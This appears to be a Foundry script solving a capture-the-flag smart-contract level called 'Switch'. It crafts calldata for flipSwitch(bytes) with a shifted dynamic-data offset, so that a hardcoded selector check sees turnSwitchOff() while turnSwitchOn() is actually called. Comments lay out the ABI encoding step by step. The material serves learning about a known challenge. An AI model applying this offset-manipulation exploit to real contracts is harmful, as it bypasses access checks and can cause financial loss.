// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import "../src/Switch.sol";

contract SwitchSolve is Script {
    Switch public sw = Switch(0x8592a0765f942ba46ADf3a0EB1fF57b1d74664F0);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Switch  : ", sw.switchOn());

        // bytes memory data = abi.encodeWithSignature("turnSwitchOff()");
        bytes memory data = abi.encodeWithSignature("flipSwitch(bytes)",0x60, 0x00, 0x20606e1500000000000000000000000000000000000000000000000000000000, 0x04, 0x76227e1200000000000000000000000000000000000000000000000000000000);

        console.logBytes(data);

        address(sw).call(data);



        console.log("Switch  : ", sw.switchOn());


        vm.stopBroadcast();
    }
}

/*
flipSwitch() ==> 0x30c13ade

30c13ade
00 : 0000000000000000000000000000000000000000000000000000000000000020  ==> Offset --> Starting of the actual data to be used inside function (_datas)
20 : 0000000000000000000000000000000000000000000000000000000000000004  ==> Length --> Length of the data (Only for Dynamic Arguments)
40 : 0x20606e15000000000000000000000000000000000000000000000000000060  ==> Data --> turnSwitchOff() selector
    

30c13ade
00 : 00000000000000000000000000000000000000000000000000000000000000[60]  ==> Offset --> Starting of the actual data to be used inside function (_datas)
20 : 0000000000000000000000000000000000000000000000000000000000000000      ==> Dummy data
40 : 0x20606e15000000000000000000000000000000000000000000000000000000  ==> Data --> turnSwitchOff() selector (By passes hardcoded check in onlyOff)
60 : 0000000000000000000000000000000000000000000000000000000000000004  ==> Length --> Length of the data (Only for Dynamic Arguments)
80 : 76227e1200000000000000000000000000000000000000000000000000000000  ==> Actual data 

0x30c13ade
     0000000000000000000000000000000000000000000000000000000000000060
     0000000000000000000000000000000000000000000000000000000000000000
     0020606e15000000000000000000000000000000000000000000000000000000
     0000000000000000000000000000000000000000000000000000000000000004
     76227e1200000000000000000000000000000000000000000000000000000000
0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000
*/ 
